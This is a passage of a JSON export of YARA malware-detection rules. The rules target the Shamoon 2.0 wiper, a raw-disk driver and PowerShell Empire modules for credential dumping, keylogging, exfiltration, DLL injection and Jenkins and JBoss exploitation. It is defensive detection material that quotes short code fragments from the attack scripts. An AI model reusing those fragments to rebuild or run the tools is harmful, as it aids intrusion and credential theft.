\"Software\\\\Sysinternals\\\\%s\" fullword ascii\n      $n1 = \"Mark Russinovich\" wide ascii\n      $nfp1 = \"<<<Obsolete>>>\" fullword wide\n      $nfp2 = \"BGInfo - Wallpaper text configurator\" wide\n      $nfp3 = \"usage: movefile [source] [dest]\" wide\n      $nfp4 = \"LoadOrder information has been copied\" wide\n      $nfp5 = \"Cache working set cleared\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $s1 and not $n1 and not 1 of ( $nfp* ) )\n}","date":"2016-12-06 13:11:21","description":"SysInternals Tool Anomaly - does not contain Mark Russinovich as author","minimum_yara":"1.7","name":"SysInternals_Tool_Anomaly_RID312D","reference":"Internal Research","required_modules":[],"rule_hash":"cddeac6cfa8f9d025ab09b0b44d0fd5b","score":50,"tags":["DEMO","EXE","FILE","ANOMALY"]},{"author":"Florian Roth","content":"rule Shamoon2_Wiper_RID2C7E : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects Shamoon 2.0 Wiper Component\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01 09:51:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\??\\\\%s\\\\System32\\\\%s.exe\" fullword wide\n      $x1 = \"IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB\" wide\n      $s1 = \"UFWYNYNTS\" fullword wide\n      $s2 = \"\\\\\\\\?\\\\ElRawDisk\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 3 of them )\n}","date":"2016-12-01 09:51:31","description":"Detects Shamoon 2.0 Wiper Component","minimum_yara":"1.7","name":"Shamoon2_Wiper_RID2C7E","reference":"https://goo.gl/jKIfGB","required_modules":[],"rule_hash":"a6447177a8e7461b725a752e7a2489d8","score":70,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule Shamoon2_ComComp_RID2D25 : APT DEMO EXE FILE MIDDLE_EAST T1083 {\n   meta:\n      description = \"Detects Shamoon 2.0 Communication Components\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01 10:19:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST, T1083\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mkdir %s%s > nul 2>&1\" fullword ascii\n      $s2 = \"p[%s%s%d.%s\" fullword ascii\n      $op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 } \n      $op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d } \n      $op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( all of ( $s* ) or all of ( $op* ) )\n}","date":"2016-12-01 10:19:21","description":"Detects Shamoon 2.0 Communication Components","minimum_yara":"1.7","name":"Shamoon2_ComComp_RID2D25","reference":"https://goo.gl/jKIfGB","required_modules":[],"rule_hash":"e751182f5c9bdb90ac0c24730c64e015","score":70,"tags":["DEMO","FILE","MIDDLE_EAST","APT","T1083","EXE"]},{"author":"Florian Roth","content":"rule EldoS_RawDisk_RID2BFC : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01 09:29:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"g\\\\system32\\\\\" fullword wide\n      $s2 = \"ztvttw\" fullword wide\n      $s3 = \"lwizvm\" fullword ascii\n      $s4 = \"FEJIKC\" fullword ascii\n      $s5 = \"INZQND\" fullword ascii\n      $s6 = \"IUTLOM\" fullword wide\n      $s7 = \"DKFKCK\" fullword ascii\n      $op1 = { 94 35 77 73 03 40 eb e9 } \n      $op2 = { 80 7c 41 01 00 74 0a 3d } \n      $op3 = { 74 0a 3d 00 94 35 77 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them )\n}","date":"2016-12-01 09:29:51","description":"EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)","minimum_yara":"1.7","name":"EldoS_RawDisk_RID2BFC","reference":"https://goo.gl/jKIfGB","required_modules":[],"rule_hash":"ce1afeb11c3dfbc0d48b5820678fece6","score":50,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule RawDisk_Driver_RID2C91 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects ElRawDisk Driver\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01 09:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\#{9A6DB7D2-FECF-41ff-9A92-6EDA696613DF}#\" wide\n      $a2 = \"\\\\#{8A6DB7D2-FECF-41ff-9A92-6EDA696613DE}#\" wide\n      $s1 = \"\\\\amd64\\\\elrawdsk.pdb\" fullword ascii\n      $s2 = \"RawDiskSample.exe\" fullword wide\n      $s3 = \"RawDisk Driver. Allows write access to files and raw disk sectors for user mode applications in Windows 2000 and later.\" fullword wide\n      $s4 = \"elrawdsk.sys\" fullword wide\n      $s5 = \"\\\\DosDevices\\\\ElRawDisk\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of ( $a* ) and 1 of ( $s* ) )\n}","date":"2016-12-01 09:54:41","description":"Detects ElRawDisk Driver","minimum_yara":"1.7","name":"RawDisk_Driver_RID2C91","reference":"https://goo.gl/jKIfGB","required_modules":[],"rule_hash":"9eeac6827ac5fbedb6139d2291eeba22","score":70,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Empire_Install_SSP_RID2DFE : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Install-SSP.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Install-SSP -Path .\\\\mimilib.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them\n}","date":"2016-11-05 10:55:31","description":"Detects Empire component - file Install-SSP.ps1","minimum_yara":"1.7","name":"Empire_Install_SSP_RID2DFE","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"21f3004f4cdd85bd32619be69e642f8d","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_MetasploitPayload_RID3389 : DEMO FILE METASPLOIT SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-MetasploitPayload.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, METASPLOIT, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$ProcessInfo.Arguments=\\\"-nop -c $DownloadCradle\\\"\" fullword ascii\n      $s2 = \"$PowershellExe=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 9KB and 1 of them ) or all of them\n}","date":"2016-11-05 14:52:01","description":"Detects Empire component - file Invoke-MetasploitPayload.ps1","minimum_yara":"1.7","name":"Empire_Invoke_MetasploitPayload_RID3389","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"f374984d4a9a8d9e693de479f61fe26d","score":75,"tags":["METASPLOIT","DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Exploit_Jenkins_RID2FE8 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Exploit-Jenkins.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$postdata=\\\"script=println+new+ProcessBuilder%28%27\\\"+$($Cmd)+\\\"\" ascii\n      $s2 = \"$url = \\\"http://\\\"+$($Rhost)+\\\":\\\"+$($Port)+\\\"/script\\\"\" fullword ascii\n      $s3 = \"$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6620 and filesize < 7KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:17:11","description":"Detects Empire component - file Exploit-Jenkins.ps1","minimum_yara":"1.7","name":"Empire_Exploit_Jenkins_RID2FE8","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"fcc7c2ff213cbd95e99615bc0e098309","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Get_SecurityPackages_RID31C8 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Get-SecurityPackages.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:37:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)\" fullword ascii\n      $s2 = \"$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them\n}","date":"2016-11-05 13:37:11","description":"Detects Empire component - file Get-SecurityPackages.ps1","minimum_yara":"1.7","name":"Empire_Get_SecurityPackages_RID31C8","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"f38f2c0ac0404985c807792c27bba37a","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_PowerDump_RID3040 : DEMO FILE HKTL SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-PowerDump.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x16 = \"$enc = Get-PostHashdumpScript\" fullword ascii\n      $x19 = \"$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;\" fullword ascii\n      $x20 = \"$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2023 and filesize < 60KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:31:51","description":"Detects Empire component - file Invoke-PowerDump.ps1","minimum_yara":"1.7","name":"Empire_Invoke_PowerDump_RID3040","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"bd9fa7c5e957bff85c98a5cdb7bfdef6","score":75,"tags":["DEMO","T1064","SCRIPT","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Empire_Invoke_ShellcodeMSIL_RID3165 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-ShellcodeMSIL.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$FinalShellcode.Length\" fullword ascii\n      $s2 = \"@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)\" fullword ascii\n      $s3 = \"@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,\" fullword ascii\n      $s4 = \"$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}","date":"2016-11-05 13:20:41","description":"Detects Empire component - file Invoke-ShellcodeMSIL.ps1","minimum_yara":"1.7","name":"Empire_Invoke_ShellcodeMSIL_RID3165","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"05e723bc6cae299a10241a2d62423a6b","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule HKTL_Empire_PowerUp_RID2E36 : DEMO FILE HKTL SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file PowerUp.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"$PoolPasswordCmd = 'c:\\\\windows\\\\system32\\\\inetsrv\\\\appcmd.exe list apppool\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:04:51","description":"Detects Empire component - file PowerUp.ps1","minimum_yara":"1.7","name":"HKTL_Empire_PowerUp_RID2E36","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"0a149cc203710721cb9b7fe06ebfa24d","score":75,"tags":["DEMO","T1064","SCRIPT","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Empire_Get_GPPPassword_RID2F8B : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Get-GPPPassword.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Base64Decoded = [Convert]::FromBase64String($Cpassword)\" fullword ascii\n      $s2 = \"$XMlFiles += Get-ChildItem -Path \\\"\\\\\\\\$DomainController\\\\SYSVOL\\\" -Recurse\" ascii\n      $s3 = \"function Get-DecryptedCpassword {\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:01:41","description":"Detects Empire component - file Get-GPPPassword.ps1","minimum_yara":"1.7","name":"Empire_Get_GPPPassword_RID2F8B","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"f2f1c775c6199ebe1619c2a28597e7f6","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_SmbScanner_RID3089 : DEMO FILE HKTL SCRIPT T1018 T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-SmbScanner.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:44:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1018, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$up = Test-Connection -count 1 -Quiet -ComputerName $Computer \" fullword ascii\n      $s2 = \"$out | add-member Noteproperty 'Password' $Password\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:44:01","description":"Detects Empire component - file Invoke-SmbScanner.ps1","minimum_yara":"1.7","name":"Empire_Invoke_SmbScanner_RID3089","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"3c09e2ec7c54701e54380ceb0423278f","score":75,"tags":["T1064","SCRIPT","DEMO","FILE","T1018","HKTL"]},{"author":"Florian Roth","content":"rule Empire_Exploit_JBoss_RID2EF7 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Exploit-JBoss.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Exploit-JBoss\" fullword ascii\n      $s2 = \"$URL = \\\"http$($SSL)://\\\" + $($Rhost) + ':' + $($Port)\" ascii\n      $s3 = \"\\\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service\" ascii\n      $s4 = \"http://blog.rvrsh3ll.net\" fullword ascii\n      $s5 = \"Remote URL to your own WARFile to deploy.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:37:01","description":"Detects Empire component - file Exploit-JBoss.ps1","minimum_yara":"1.7","name":"Empire_Exploit_JBoss_RID2EF7","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"431a913047e22558fba85862c81399fc","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_dumpCredStore_RID2F13 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file dumpCredStore.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[DllImport(\\\"Advapi32.dll\\\", SetLastError = true, EntryPoint = \\\"CredReadW\\\"\" ascii\n      $s12 = \"[String] $Msg = \\\"Failed to enumerate credentials store for user '$Env:UserName'\\\"\" fullword ascii\n      $s15 = \"Rtn = CredRead(\\\"Target\\\", CRED_TYPE.GENERIC, out Cred);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 40KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:41:41","description":"Detects Empire component - file dumpCredStore.ps1","minimum_yara":"1.7","name":"Empire_dumpCredStore_RID2F13","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"66e299e00a39a39816860d5e2432e466","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_EgressCheck_RID30E4 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-EgressCheck.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"egress -ip $ip -port $c -delay $delay -protocol $protocol\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x233c and filesize < 10KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:59:11","description":"Detects Empire component - file Invoke-EgressCheck.ps1","minimum_yara":"1.7","name":"Empire_Invoke_EgressCheck_RID30E4","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"8a180036af68dafdad3d4bf02db4bd65","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_ReflectivePick_x64_orig_RID32B3 : DEMO EXE FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file ReflectivePick_x64_orig.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 14:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\PowerShellRunner.pdb\" fullword ascii\n      $s2 = \"PowerShellRunner.dll\" fullword wide\n      $s3 = \"ReflectivePick_x64.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them ) or all of them\n}","date":"2016-11-05 14:16:21","description":"Detects Empire component - file ReflectivePick_x64_orig.dll","minimum_yara":"1.7","name":"Empire_ReflectivePick_x64_orig_RID32B3","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"fff228861d89a014b39875e95262224f","score":75,"tags":["DEMO","EXE","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Out_Minidump_RID2EAC : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Out-Minidump.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\" fullword ascii\n      $s2 = \"$ProcessFileName = \\\"$($ProcessName)_$($ProcessId).dmp\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:24:31","description":"Detects Empire component - file Out-Minidump.ps1","minimum_yara":"1.7","name":"Empire_Out_Minidump_RID2EAC","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"0d96fa4ec66cf2f06dc81ce481a04d42","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_PsExec_RID2EE5 : DEMO FILE SCRIPT T1035 T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-PsExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1035, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Invoke-PsExecCmd\" fullword ascii\n      $s2 = \"\\\"[*] Executing service .EXE\" fullword ascii\n      $s3 = \"$cmd = \\\"%COMSPEC% /C echo $Command ^> %systemroot%\\\\Temp\\\\\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 50KB and 1 of them ) or all of them\n}","date":"2016-11-05 11:34:01","description":"Detects Empire component - file Invoke-PsExec.ps1","minimum_yara":"1.7","name":"Empire_Invoke_PsExec_RID2EE5","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"9fc5d8f8ca4a3d93041eccb517bc3d3b","score":75,"tags":["DEMO","T1064","T1035","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_PostExfil_RID303B : DEMO FILE SCRIPT T1020 T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-PostExfil.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1020, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"# upload to a specified exfil URI\" fullword ascii\n      $s2 = \"Server path to exfil to.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x490a and filesize < 2KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:31:01","description":"Detects Empire component - file Invoke-PostExfil.ps1","minimum_yara":"1.7","name":"Empire_Invoke_PostExfil_RID303B","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"8cc9c8f05018561c93ed9808d63a1102","score":75,"tags":["DEMO","T1064","SCRIPT","FILE","T1020"]},{"author":"Florian Roth","content":"rule Empire_Invoke_SMBAutoBrute_RID311A : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-SMBAutoBrute.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] PDC: LAB-2008-DC1.lab.com\" fullword ascii\n      $s2 = \"$attempts = Get-UserBadPwdCount $userid $dcs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}","date":"2016-11-05 13:08:11","description":"Detects Empire component - file Invoke-SMBAutoBrute.ps1","minimum_yara":"1.7","name":"Empire_Invoke_SMBAutoBrute_RID311A","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"aff6eb5f253f644054f3122bc585ee17","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Get_Keystrokes_RID2F85 : DEMO FILE SCRIPT T1064 {\n   meta:\n      description = \"Detects Empire component - file Get-Keystrokes.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 12:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them\n}","date":"2016-11-05 12:00:41","description":"Detects Empire component - file Get-Keystrokes.ps1","minimum_yara":"1.7","name":"Empire_Get_Keystrokes_RID2F85","reference":"https://github.com/adaptivethreat/Empire","required_modules":[],"rule_hash":"8d02d71ef33099cc0ef4475eefef83cc","score":75,"tags":["DEMO","T1064","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_DllInjection_RID315C : DEMO FILE HKTL SCRIPT T1055 T1064 {\n   meta:\n      description = \"Detects Empire component - file Invoke-DllInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05 13:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1055, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-Dll evil.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 40KB and 1 of them ) or all of them\n}","date":"2016-11-05 13:19:11","description":"Detects Empire component - file 